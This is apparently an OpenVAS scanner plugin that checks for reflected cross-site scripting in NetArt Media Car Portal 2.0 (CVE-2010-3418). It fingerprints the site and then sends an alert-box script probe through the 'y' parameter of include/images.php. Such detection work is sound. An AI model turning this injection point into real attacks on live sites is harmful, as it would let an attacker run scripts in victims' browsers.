##############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_netart_media_car_portal_mult_xss_vuln.nasl 14 2013-10-27 12:33:37Z jan $
#
# NetArt Media Car Portal Multiple Cross-site Scripting Vulnerabilities
#
# Authors:
# Madhuri D <dmadhuri@secpod.com>
#
# Copyright:
# Copyright (c) 2010 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will allow attacker to execute arbitrary HTML and
  script code in a user's browser session in the context of an affected site.
  Impact Level: Application.";
tag_affected = "NetArt Media Car Portal version 2.0";

tag_insight = "Input passed via the 'y' parameter to 'include/images.php' and 'car_id'
  parameter to 'index.php' are not properly sanitised.";
tag_solution = "No solution or patch is available as of 1st October, 2010. Information
  regarding this issue will be updated once the solution details are available.
  For updates refer to http://www.netartmedia.net/carsportal/";
tag_summary = "This host is running NetArt Media Car Portal and is prone to multiple
  cross-site scripting vulnerabilities.";

if(description)
{
  script_id(801454);
  script_version("$Revision: 14 $");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:33:37 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2010-10-05 07:29:45 +0200 (Tue, 05 Oct 2010)");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"risk_factor", value:"Medium");
  script_cve_id("CVE-2010-3418");
  script_bugtraq_id(43145);
  script_name("NetArt Media Car Portal Multiple Cross-site Scripting Vulnerabilities");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "
  Affected Software/OS:
  " + tag_affected + "
  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://secunia.com/advisories/41366");
  script_xref(name : "URL" , value : "http://xforce.iss.net/xforce/xfdb/61728");
  script_xref(name : "URL" , value : "http://pridels-team.blogspot.com/2010/09/netartmedia-car-portal-v20-xss-vuln.html");
  
  script_description(desc);
  script_summary("Check NetArt Media Car Portal XSS attack");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2010 Greenbone Networks GmbH");
  script_family("Web application abuses");
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
  }
  exit(0);
}


include("version_func.inc");
include("http_func.inc");

## Get HTTP port
carPort = get_http_port(default:80);
if(!carPort){
  exit(0);
}

foreach dir (make_list("/car_portal", "/", cgi_dirs()))
{
  ## Send and Receive the response
  sndReq = http_get(item:string(dir, "/index.php"), port:carPort);
  rcvRes = http_send_recv(port:carPort, data:sndReq);

  ## Confirm application is NetArt Media Car Portal
  if(">Car Portal<" >< rcvRes)
  {
    ## Try Exploit
    sndReq = http_get(item:string(dir, '/include/images.php?y=<script>' +
                           'alert("OpenVAS-XSS")</script>'), port:carPort);
    rcvRes = http_send_recv(port:carPort, data:sndReq);

    ## Check the response to confirm vulnerability
    if(ereg(pattern:"^HTTP/[0-9]\.[0-9] 200 .*", string:rcvRes) &&
                    '<script>alert(\"OpenVAS-XSS\")</script>' >< rcvRes){
      security_warning(carPort);
    }
  }
}
